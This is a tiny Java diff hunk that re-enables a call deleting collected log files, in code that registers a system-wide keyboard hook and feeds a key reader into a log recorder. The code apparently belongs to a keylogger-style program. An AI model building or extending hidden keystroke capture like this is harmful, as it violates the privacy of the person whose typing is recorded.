@@ -42,7 +42,7 @@ public class LogicFlow {
         }
 
         //TODO
-        //logFilesCollector.removeLogs(files);
+        logFilesCollector.removeLogs(files);
         GlobalScreen.registerNativeHook();
         logRecorder = new LogRecorder();
         writerTask = new WriterTask(keyReader,logRecorder);
